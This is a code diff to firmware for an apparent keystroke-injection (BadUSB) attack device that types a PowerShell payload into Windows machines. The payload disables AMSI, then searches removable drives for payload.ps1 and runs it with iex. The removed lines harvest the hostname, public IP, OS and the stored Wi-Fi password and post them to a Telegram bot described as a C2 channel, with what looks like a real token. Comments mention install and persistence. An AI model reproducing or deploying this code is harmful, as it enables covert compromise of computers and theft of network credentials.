@@ -20,36 +20,24 @@ static volatile bool s_payload_running = false;
 static lv_obj_t *s_locked_screen = NULL;
 static lv_obj_t *s_sd_label = NULL;
 
-// Locates the M4NT1S payload by scanning removable drives for payload.ps1.
-// Does NOT depend on the volume label being readable — Windows FAT12 mounts
-// this image without exposing the BPB volume name, so any label-based
-// lookup fails. Filesystem access itself works fine.
+// Minimal typed payload (~400 chars):
+//   1. AMSI bypass so payload.ps1 runs without interference
+//   2. Find the M4NT1S payload.ps1 by scanning removable drives
+//   3. iex it
+// All recon, Telegram notification, install, and persistence live inside
+// payload.ps1 itself. This dramatically reduces HID failure surface.
 static const char *PS_PAYLOAD =
     "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
     "$f=$a.GetField('amsiContext','NonPublic,Static');"
     "$c=$f.GetValue($null);"
     "[Runtime.InteropServices.Marshal]::WriteInt64($c,8,0);"
-    "$st=if(Test-Path 'C:\\ProgramData\\Microsoft\\DeviceMetadata\\installed.lock'){'Reconnected'}else{'New'};"
-    "$n=$env:COMPUTERNAME;"
-    "$ip=(irm https://ipinfo.io/ip);"
-    "$s=(Get-NetConnectionProfile).Name;"
-    "$p='None';"
-    "$pr=netsh wlan show profiles name=\"$s\" key=clear;"
-    "foreach($l in $pr){if($l -match 'Key Content'){$p=($l -split ':',2)[1].Trim();break}};"
-    "$o=(Get-CimInstance Win32_OperatingSystem).Caption;"
-    "$t=\"[$st] C2 Connection`n`nDevice: $n`nIP: $ip`nSSID: $s`nPass: $p`nOS: $o\";"
-    "irm -Uri 'https://api.telegram.org/bot8609491076:AAEa7h3yGrolKQI93NbSMIKKLrpgu4eyVEE/sendMessage' -Method Post -Body @{chat_id='7984959772';text=$t};"
     "$d=$null;"
     "for($i=0;$i-lt30-and-not$d;$i++){"
     "$c=gcim Win32_LogicalDisk -ErrorAction SilentlyContinue|?{$_.DriveType -eq 2};"
     "foreach($x in $c){if($x.DeviceID-and(Test-Path \"$($x.DeviceID)\\payload.ps1\")){$d=$x.DeviceID;break}};"
     "if(-not$d){sleep 1}"
     "};"
-    "if(-not$d){Write-Host 'M4NT1S payload.ps1 not found on any removable drive';exit};"
-    "$sz=(Get-Item \"$d\\payload.ps1\").Length;"
-    "if($sz -lt 100){Write-Host \"payload.ps1 is $sz bytes - quarantined?\";exit};"
-    "Write-Host \"Running payload.ps1 from $d ($sz bytes)\";"
-    "iex(Get-Content \"$d\\payload.ps1\" -Raw)";
+    "if($d){iex(Get-Content \"$d\\payload.ps1\" -Raw)}";
 
 static void format_free_space(char *out, size_t out_len)
 {
@@ -138,7 +126,7 @@ static void payload_task(void *arg)
     hid_payload_send_string(PS_PAYLOAD);
     hid_payload_send_enter();
 
-    // 30 s drive poll + install + first registration
+    // ~30s drive poll + install + first registration
     vTaskDelay(pdMS_TO_TICKS(45000));
 
     status_led_set_mode(LED_MODE_IDLE);
